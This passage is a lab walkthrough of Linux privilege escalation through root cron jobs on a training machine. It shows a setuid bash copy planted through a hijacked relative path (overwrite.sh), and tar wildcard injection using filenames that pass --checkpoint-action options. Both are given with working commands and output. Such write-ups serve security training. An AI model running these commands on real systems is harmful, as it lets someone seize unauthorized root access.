
When we have access to a machine one thing we can check is what `cron jobs` the machine is running. There are several places we can read this info from, and the most common place is `etc/crontab`

```bash
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

We see that there are two processes that are run every minute as `root`, which can be exploited to gain root access.

## Paths

We can see there is a binary named `overwrite.sh` is being run using a relative path. If we look at the `$PATH` variables we can see the first location is `/home/user`. We can first check wether there is such a file in that directory.

```bash
TCM@debian:~$ ls -la /home/user/
total 48
drwxr-xr-x  5 TCM  user 4096 Jun 18  2020 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user  801 Jun 18  2020 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Jun 18  2020 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
```

We can see that there is no such file. Since we have write access to this directory, we can create a file as follow and give it executable rights.

```bash
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash;' > /home/user/overwrite.sh
TCM@debian:~$ cat overwrite.sh 
cp /bin/bash /tmp/bash; chmod +s /tmp/bash;
TCM@debian:~$ chmod +x overwrite.sh
TCM@debian:~$ ls -l
total 12
-rw-r--r--  1 TCM user  212 May 15  2017 myvpn.ovpn
-rwxr-xr-x  1 TCM user   44 Jun 11 07:56 overwrite.sh
drwxr-xr-x 10 TCM user 4096 Jun 18  2020 tools
```

Now we just got to wait for a while and check whether `bash` has been copied over to the `/tmp` directory. Once it has, we simply need to run it with the `-p` flag.

```bash
TCM@debian:~$ ls /tmp/ -la
total 196
drwxrwxrwt  2 root root   4096 Jun 11 07:58 .
drwxr-xr-x 22 root root   4096 Jun 17  2020 ..
-rw-r--r--  1 root root 181544 Jun 11 07:58 backup.tar.gz
-rw-r--r--  1 root root     29 Jun 11 07:58 useless

TCM@debian:~$ ls /tmp/ -la
total 1108
drwxrwxrwt  2 root root   4096 Jun 11 07:59 .
drwxr-xr-x 22 root root   4096 Jun 17  2020 ..
-rw-r--r--  1 root root 181544 Jun 11 07:59 backup.tar.gz
-rwsr-sr-x  1 root root 926536 Jun 11 07:59 bash
-rw-r--r--  1 root root     29 Jun 11 07:58 useless

TCM@debian:~$ /tmp/bash -p
bash-4.1# whoami
root
```


## Wildcards

Now let's have a look at the other cron job that is running every minute.

```bash
TCM@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
TCM@debian:~$ ls -la /usr/local/bin/compress.sh 
-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh
```

Since we do not have write permission to the file, we cannot edit it. However, this uses a wildcard which we can use for injection. `tar` has the following two flags:

- `--checkpoint`: display progress messages every NUMBERth record (default 10)
- `--checkpoint-action=ACTION`: execute ACTION on each checkpoint

We can create two files with these flags as the name and running a custom binary as the action.

```bash
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash_new; chmod +s /tmp/bash_new' > runme.sh
TCM@debian:~$ chmod +x runme.sh
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
TCM@debian:~$ ls -l
total 16
-rw-r--r--  1 TCM user    0 Jun 11 08:33 --checkpoint=1
-rw-r--r--  1 TCM user    0 Jun 11 08:34 --checkpoint-action=exec=sh runme.sh
-rw-r--r--  1 TCM user  212 May 15  2017 myvpn.ovpn
-rwxr-xr-x  1 TCM user   44 Jun 11 07:56 overwrite.sh
-rwxr-xr-x  1 TCM user   51 Jun 11 08:22 runme.sh
drwxr-xr-x 10 TCM user 4096 Jun 18  2020 tools
```

Now when the `tar` command is run via the cron job, the executed command looks something like this:

`tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh runme.sh`

Which would execute out binary in `/home/user` as root, giving us a copy of bash with the sticky bit set.

```bash
TCM@debian:~$ ls -l /tmp/
total 2012
-rw-r--r-- 1 root root 181546 Jun 11 08:41 backup.tar.gz
-rwsr-sr-x 1 root root 926536 Jun 11 08:41 bash
-rwsr-sr-x 1 root root 926536 Jun 11 08:41 bash_new
-rw-r--r-- 1 root root     29 Jun 11 07:58 useless

TCM@debian:~$ /tmp/bash_new -p
bash_new-4.1# whoami
root
```


## File Overwrites

